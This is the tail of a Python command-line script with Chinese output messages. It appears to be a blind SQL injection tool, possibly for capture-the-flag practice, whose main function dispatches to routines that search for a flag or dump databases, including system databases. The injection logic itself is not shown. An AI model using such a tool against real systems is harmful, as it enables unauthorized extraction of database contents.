    print(f"[*] 参数: {cfg.param}")
    print(f"[*] 查询: {cfg.query}")
    print(f"[*] 真值特征模式: {'auto' if cfg.auto_mark else cfg.check_mode}")
    print()

    try:
        if cfg.dump_flag:
            dump_flag_search(cfg, cfg.dump_flag)
        elif cfg.dump_all:
            dump_databases(cfg, include_system=True)
        elif cfg.dump:
            dump_databases(cfg, include_system=False)
        else:
            extract(cfg)
        wait_on_exit()
        return 0
    except KeyboardInterrupt:
        print("\n[!] 用户中断。")
        wait_on_exit()
        return 130
    except Exception as e:
        print(f"\n[!] 运行异常: {e}")
        wait_on_exit()
        return 1


if __name__ == "__main__":
    sys.exit(main())
